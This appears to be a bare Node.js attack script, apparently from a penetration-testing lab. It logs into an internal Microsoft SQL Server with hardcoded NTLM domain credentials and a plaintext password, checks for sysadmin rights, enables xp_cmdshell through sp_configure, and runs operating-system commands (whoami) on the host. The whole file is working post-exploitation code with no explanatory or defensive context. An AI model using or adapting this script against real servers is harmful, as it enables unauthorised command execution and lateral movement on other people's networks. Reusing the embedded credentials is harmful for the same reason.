const sql = require("mssql");

(async () => {
  const cfg = {
    server: "172.16.0.11",
    database: "master",
    authentication: {
      type: "ntlm",
      options: {
        domain: "ODYSSEY",
        userName: "svc-mssql",
        password: "cml958782",
      },
    },
    options: {
      encrypt: false,
      trustServerCertificate: true,
      enableArithAbort: true,
    },
    port: 1433,
  };
  try {
    await sql.connect(cfg);
    let r = await sql.query("SELECT SYSTEM_USER AS u, IS_SRVROLEMEMBER('sysadmin') AS sa");
    console.log("login", JSON.stringify(r.recordset));
    await sql.query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
    await sql.query("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
    r = await sql.query("EXEC xp_cmdshell 'whoami'");
    console.log("whoami", JSON.stringify(r.recordset));
  } catch (e) {
    console.log("ERR", e.message);
  }
  process.exit(0);
})();
